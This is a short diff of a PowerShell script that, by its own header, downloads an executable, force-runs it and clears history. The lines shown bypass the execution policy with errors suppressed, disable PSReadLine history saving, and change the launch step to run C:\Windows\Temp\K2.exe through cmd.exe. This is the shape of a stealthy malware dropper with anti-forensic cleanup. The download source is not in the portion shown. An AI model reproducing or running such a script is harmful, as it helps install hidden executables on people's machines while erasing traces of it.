@@ -1,4 +1,4 @@
-# PowerShell Script to Download, Run EXE in PS Console, Clear History, and Auto-Close
+# PowerShell Script to Download, Force Run EXE in PS, Clear History
 try {
     # Bypass execution policy
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force -ErrorAction SilentlyContinue
@@ -19,8 +19,8 @@ try {
         }
         Set-PSReadLineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
         
-        # Run EXE within PowerShell console (no new window)
-        & $tempPath
+        # Force run EXE within PowerShell console
+        cmd.exe /c "C:\Windows\Temp\K2.exe"
     }
 
 } catch {
